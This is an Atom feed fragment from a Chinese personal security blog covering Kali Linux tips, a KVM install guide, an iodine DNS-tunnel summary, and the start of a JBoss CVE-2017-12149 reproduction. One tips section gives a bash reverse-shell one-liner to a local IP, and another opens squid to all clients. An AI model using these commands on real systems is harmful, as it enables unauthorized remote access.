      &lt;h2 id=&quot;0x00-iodine简介&quot;&gt;&lt;a href=&quot;#0x00-iodine简介&quot; class=&quot;headerlink&quot; title=&quot;0x00. iodine简介&quot;&gt;&lt;/a&gt;0x00. iodine简介&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-当渗透内网时发现目标主机只开有-DNS-必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP-53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！&quot;&gt;&lt;a href=&quot;#emsp-emsp-当渗透内网时发现目标主机只开有-DNS-必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP-53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;当渗透内网时发现目标主机只开有 DNS 必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP 53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;当渗透内网时发现目标主机只开有 DNS 必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP 53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>kali使用入坑指南(一)</title>
    <link href="http://TimeS0ng.github.io/2018/03/01/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80)/"/>
    <id>http://TimeS0ng.github.io/2018/03/01/kali使用入坑指南(一)/</id>
    <published>2018-03-01T12:25:58.000Z</published>
    <updated>2018-03-05T16:02:21.509Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！"><a href="#emsp-emsp-用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！" class="headerlink" title="&emsp;&emsp;用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！"></a>&emsp;&emsp;用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！</h4><a id="more"></a>
<h2 id="0x01-kali安装中文输入法"><a href="#0x01-kali安装中文输入法" class="headerlink" title="0x01. kali安装中文输入法"></a>0x01. kali安装中文输入法</h2><blockquote>
<ol>
<li>下载ibus</li>
</ol>
<p>apt-get install ibus ibus-pinyin</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301093227_Bi7qWn_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>设置language，之后重启系统就能使用中文，不必太麻烦</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301093613_rmRK04_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-kali中安装截图软件-shutter"><a href="#0x02-kali中安装截图软件-shutter" class="headerlink" title="0x02. kali中安装截图软件 shutter"></a>0x02. kali中安装截图软件 shutter</h2><blockquote>
<p>apt-get install shutter</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301201713_O1AXhi_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>下面就是我用shutter截的桌面图片</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301201931_pWfnu9_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-kali-安装硬件检测软件-hardinfo"><a href="#0x03-kali-安装硬件检测软件-hardinfo" class="headerlink" title="0x03. kali 安装硬件检测软件 hardinfo"></a>0x03. kali 安装硬件检测软件 hardinfo</h2><blockquote>
<p>apt-get install hardinfo</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303170704_ALlIlf_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>hardinfo可以让我们轻松的查看系统硬件配置，其功能有点像鲁大师，不过我却没用过鲁大师哈哈哈哈！</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303170842_Vw0EnH_Screenshot.jpeg" alt=""></p>
<h2 id="0x04-kali-录屏软件-EasyScreenCast"><a href="#0x04-kali-录屏软件-EasyScreenCast" class="headerlink" title="0x04. kali 录屏软件 EasyScreenCast"></a>0x04. kali 录屏软件 EasyScreenCast</h2><blockquote>
<p>今天笔者也利用kali中自带的录屏软件 EasyScreenCast 录了一个Wi-Fi破解的视频放到B站，如果感兴趣可以<a href="https://www.bilibili.com/video/av20318401/" target="_blank" rel="external">戳这里</a>。EasyScreenCast 使用简单方便，根据自己需要稍稍修改一下参数就能录制满足自己简单要求的视频。</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303171817_6QKqw8_Screenshot.jpeg" alt=""></p>
<h2 id="0x05-kali-音乐播放器-VLC"><a href="#0x05-kali-音乐播放器-VLC" class="headerlink" title="0x05. kali 音乐播放器 VLC"></a>0x05. kali 音乐播放器 VLC</h2><blockquote>
<p>虽然 VLC 没有像 Mac 版QQ 音乐那么唯美的优化，但我们也不能对开源如此苛刻，毕竟它从没令我失望过！</p>
<p>apt-get install vlc</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303191548_k9LYCB_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>安装完成之后，因为它默认不能以root账号启动，所以我们需要修改 /usr/bin/vlc 文件，将原来的geteuid 修改为现在的 getppid</p>
<p>hexedit /usr/bin/vlc</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303191650_jLTfN6_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>在终端输入 vlc 就能调出</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303193126_rzgeBG_Screenshot.jpeg" alt=""></p>
<h2 id="0x06-kali-使用bash-一句话反弹shell"><a href="#0x06-kali-使用bash-一句话反弹shell" class="headerlink" title="0x06. kali 使用bash 一句话反弹shell"></a>0x06. kali 使用bash 一句话反弹shell</h2><blockquote>
<p>进行渗透测试时经常遇到Linux 中不存在 nc 或者 nc 一经反弹shell就出现各种报错，直到遇到bash 一句话后麻麻再也不用担心我拿不到shell 啦！！</p>
<p>bash -i &gt;&amp; /dev/tcp/192.168.1.107/4444 0&gt;&amp;1</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303192839_XDBQbF_Screenshot.jpeg" alt=""></p>
<h2 id="0x07-kali-使用ncat-作-http-代理"><a href="#0x07-kali-使用ncat-作-http-代理" class="headerlink" title="0x07. kali 使用ncat 作 http 代理"></a>0x07. kali 使用ncat 作 http 代理</h2><blockquote>
<p>当需要代理服务器时，可以使用 ncat 来代替，当然这是需要密码验证的，也不是任何人都能通过我们的代理服务器上网</p>
<p>ncat -l 8080 <strong>-</strong>-proxy-type http –proxy-auth admin:root</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303195304_KAYICq_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303195334_duCLPP_Screenshot.jpeg" alt=""></p>
<h2 id="0x08-kali-使用squid3-作http-代理"><a href="#0x08-kali-使用squid3-作http-代理" class="headerlink" title="0x08. kali 使用squid3 作http 代理"></a>0x08. kali 使用squid3 作http 代理</h2><blockquote>
<p>squid3 可以很方便的帮助我们搭建内网的http 代理服务器，当我们启动squid3 之后它会默认启动3128 端口，我们只需要在浏览器设置代理就可以使用了。不过在这之前我们首先应该修改squid3 的默认配置，将 /etc/squid/squid.conf 中的http_access deny all 修改为http_access allow all 这样才能作为代理服务器使用</p>
<p>vim /etc/squid/squid.conf</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180305175930_Xks0id_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>squid3</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180305180011_6T2Daa_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180305180036_Uxee4d_Screenshot.jpeg" alt=""></p>
<h2 id="0x09-kali-安装翻译字典"><a href="#0x09-kali-安装翻译字典" class="headerlink" title="0x09. kali 安装翻译字典"></a>0x09. kali 安装翻译字典</h2><blockquote>
<p>goldendict 是Linux 中字典的不二选择，同时它还支持选词翻译，这是一个相当不错的功能。笔者因为给自己定了个目标要看kali 官网的教程，所以只有去读英文资料，而goldendict 帮了我不小的忙！</p>
<p>下载好goldendict 之后需要稍稍配置一下词典Edict-&gt;dict-&gt;website，增加youdao 的翻译网址 <a href="http://dict.youdao.com/search?q=%GDWORD%&amp;ue=utf8" target="_blank" rel="external">http://dict.youdao.com/search?q=%GDWORD%&amp;ue=utf8</a></p>
<p>之后我们选中单词按 CTRL+C+C 就可以随时翻译了</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180305231416_6b8vJS_Screenshot.jpeg" alt=""></p>
<h2 id="0x10-kali-安装插件"><a href="#0x10-kali-安装插件" class="headerlink" title="0x10. kali 安装插件"></a>0x10. kali 安装插件</h2><blockquote>
<p>使用浏览器访问 <a href="http://extensions.gnome.org" target="_blank" rel="external">http://extensions.gnome.org</a> 就可以给kali 安装扩展，安装netspeed 插件之后就可以监控网络流量</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180305235955_Y7cZTJ_Screenshot.jpeg" alt=""></p>
<h2 id="0xFF-关于kali的小技巧"><a href="#0xFF-关于kali的小技巧" class="headerlink" title="0xFF. 关于kali的小技巧"></a>0xFF. 关于kali的小技巧</h2><h4 id="emsp-emsp-笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽-o-。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。"><a href="#emsp-emsp-笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽-o-。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。" class="headerlink" title="&emsp;&emsp;笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽 \^o^。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。"></a>&emsp;&emsp;笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽 \^o^。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。</h4><h4 id="emsp-emsp-1-利用组合键-CTRL-ALT-F6-进入kali的命令行模式"><a href="#emsp-emsp-1-利用组合键-CTRL-ALT-F6-进入kali的命令行模式" class="headerlink" title="&emsp;&emsp;1. 利用组合键 CTRL+ALT+F6 进入kali的命令行模式"></a>&emsp;&emsp;1. 利用组合键 CTRL+ALT+F6 进入kali的命令行模式</h4><h4 id="emsp-emsp-2-top命令查看当前CPU占用率最大的任务"><a href="#emsp-emsp-2-top命令查看当前CPU占用率最大的任务" class="headerlink" title="&emsp;&emsp;2. top命令查看当前CPU占用率最大的任务"></a>&emsp;&emsp;2. top命令查看当前CPU占用率最大的任务</h4><h4 id="emsp-emsp-3-pkill或者kill-掉该任务"><a href="#emsp-emsp-3-pkill或者kill-掉该任务" class="headerlink" title="&emsp;&emsp;3. pkill或者kill 掉该任务"></a>&emsp;&emsp;3. pkill或者kill 掉该任务</h4><h4 id="emsp-emsp-4-利用组合键-CTRL-ALT-F2-回到桌面环境，这样就有效的解决了桌面卡死的问题"><a href="#emsp-emsp-4-利用组合键-CTRL-ALT-F2-回到桌面环境，这样就有效的解决了桌面卡死的问题" class="headerlink" title="&emsp;&emsp;4. 利用组合键 CTRL+ALT+F2 回到桌面环境，这样就有效的解决了桌面卡死的问题"></a>&emsp;&emsp;4. 利用组合键 CTRL+ALT+F2 回到桌面环境，这样就有效的解决了桌面卡死的问题</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！&quot;&gt;&lt;a href=&quot;#emsp-emsp-用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>kali安装KVM入坑笔记</title>
    <link href="http://TimeS0ng.github.io/2018/03/01/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/"/>
    <id>http://TimeS0ng.github.io/2018/03/01/kali安装KVM入坑笔记/</id>
    <published>2018-03-01T02:18:31.000Z</published>
    <updated>2018-03-01T12:25:18.590Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM-…"><a href="#emsp-emsp-今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM-…" class="headerlink" title="&emsp;&emsp;今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM …"></a>&emsp;&emsp;今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM …</h4><a id="more"></a>
<h2 id="0x01-制作U盘启动盘"><a href="#0x01-制作U盘启动盘" class="headerlink" title="0x01. 制作U盘启动盘"></a>0x01. 制作U盘启动盘</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-1-kali-的-ISO-镜像文件"><a href="#emsp-emsp-1-kali-的-ISO-镜像文件" class="headerlink" title="&emsp;&emsp; 1. kali 的 ISO 镜像文件"></a>&emsp;&emsp; 1. kali 的 ISO 镜像文件</h4><h4 id="emsp-emsp-2-dd-命令-Linux-的bash基本都具备dd，笔者用的Mac也同样可以"><a href="#emsp-emsp-2-dd-命令-Linux-的bash基本都具备dd，笔者用的Mac也同样可以" class="headerlink" title="&emsp;&emsp; 2. dd 命令( Linux 的bash基本都具备dd，笔者用的Mac也同样可以)"></a>&emsp;&emsp; 2. dd 命令( Linux 的bash基本都具备dd，笔者用的Mac也同样可以)</h4><h4 id="emsp-emsp-3-内存足够的-U-盘"><a href="#emsp-emsp-3-内存足够的-U-盘" class="headerlink" title="&emsp;&emsp; 3. 内存足够的 U 盘"></a>&emsp;&emsp; 3. 内存足够的 U 盘</h4><h3 id="制作启动盘"><a href="#制作启动盘" class="headerlink" title="制作启动盘"></a>制作启动盘</h3><blockquote>
<ol>
<li>查看U盘挂载的路径 diskutil list</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180228215645_iufWDx_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>卸载U盘 diskutil unmountDisk /dev/disk2</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180228215821_WGGQLO_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>用dd命令制作安装盘（这个过程大概持续10+分钟，急不得\^o^ ）</li>
</ol>
<p>sudo dd if=/Users/apple1/Desktop/kali-linux-2018.1-amd64.iso of=/dev/disk2 bs=1m</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180228222201_a2Gt2A_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-利用-U盘启动盘安装kali"><a href="#0x02-利用-U盘启动盘安装kali" class="headerlink" title="0x02. 利用 U盘启动盘安装kali"></a>0x02. 利用 U盘启动盘安装kali</h2><blockquote>
<ol>
<li><p>将 U盘启动盘插入台式机，启动电源并按住Delete键进入BIOS模式</p>
</li>
<li><p>选择高级模式，开启Intel的虚拟技术（ 开启这个之后才能安装KVM ）</p>
</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180228222954_ou6My2_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>选择系统的启动顺序，将U盘放到最前面</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180228223237_pRdztx_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>现在就可以保存退出了，就能进入kali的安装界面，kali安装过程就不介绍了，网上一大堆安装教程</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180228223402_BBNrKS_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>安装完成之后进入kali系统</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180228225257_Ei4Sz0_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-安装KVM"><a href="#0x03-安装KVM" class="headerlink" title="0x03. 安装KVM"></a>0x03. 安装KVM</h2><blockquote>
<ol>
<li>刚下载的系统需要先更新源 vim /etc/apt/sources.list</li>
</ol>
<p>#中科大</p>
<p>deb <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="external">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>
<p>deb-src <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="external">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>
<p>#阿里云</p>
<p>deb <a href="http://mirrors.aliyun.com/kali" target="_blank" rel="external">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p>
<p>deb-src <a href="http://mirrors.aliyun.com/kali" target="_blank" rel="external">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p>
<ol>
<li>更新索引 apt-get update</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180228231246_F7Xk8C_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>下载KVM及其依赖包</li>
</ol>
<p>apt-get install kvmtool qemu virtinst python-libvirt virt-viewer virt-manager</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180228231559_jUPJBA_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>KVM 下载完成，查看是否正常启动(笔者已经可以正常使用KVM了)</li>
</ol>
<p>service libvirtd status</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180228231853_87vYF9_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>打开KVM，安装windows 2003 server r2 镜像</li>
</ol>
<p>virt-manager</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180228233431_Nknrv6_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180228233108_OVhcrA_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180228233136_Tfl8g6_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>安装完之后有可能启动虚拟机时有可能会报错提示：Error starting domain: Requested operation is not valid: network ‘default’ is not active </li>
</ol>
<p>此时我们只需要将原有的网卡删除重新添加一块网卡就可以了</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301094610_WjQFmC_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301094845_S7Zuib_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301095052_jL9mvJ_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301095118_iosA7r_Screenshot.jpeg" alt=""></p>
<h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04. 结语"></a>0x04. 结语</h2><h4 id="emsp-emsp-网上很多教程实际去操作时感觉都有些许瑕疵，很多时候达不到自己的要求，所以自己记录一下平时配置环境的过程下次遇到时看自己的文章就可以了，哇咔咔！！"><a href="#emsp-emsp-网上很多教程实际去操作时感觉都有些许瑕疵，很多时候达不到自己的要求，所以自己记录一下平时配置环境的过程下次遇到时看自己的文章就可以了，哇咔咔！！" class="headerlink" title="&emsp;&emsp;网上很多教程实际去操作时感觉都有些许瑕疵，很多时候达不到自己的要求，所以自己记录一下平时配置环境的过程下次遇到时看自己的文章就可以了，哇咔咔！！"></a>&emsp;&emsp;网上很多教程实际去操作时感觉都有些许瑕疵，很多时候达不到自己的要求，所以自己记录一下平时配置环境的过程下次遇到时看自己的文章就可以了，哇咔咔！！</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM-…&quot;&gt;&lt;a href=&quot;#emsp-emsp-今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM-…&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM …&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM …&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>JOBSS反序列化漏洞复现</title>
    <link href="http://TimeS0ng.github.io/2017/12/27/JBOSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://TimeS0ng.github.io/2017/12/27/JBOSS反序列化漏洞复现/</id>
    <published>2017-12-27T02:39:14.000Z</published>
    <updated>2017-12-27T11:47:55.653Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00. 漏洞描述"></a>0x00. 漏洞描述</h2><h4 id="2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。"><a href="#2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。" class="headerlink" title="2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。"></a>2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。</h4><a id="more"></a>
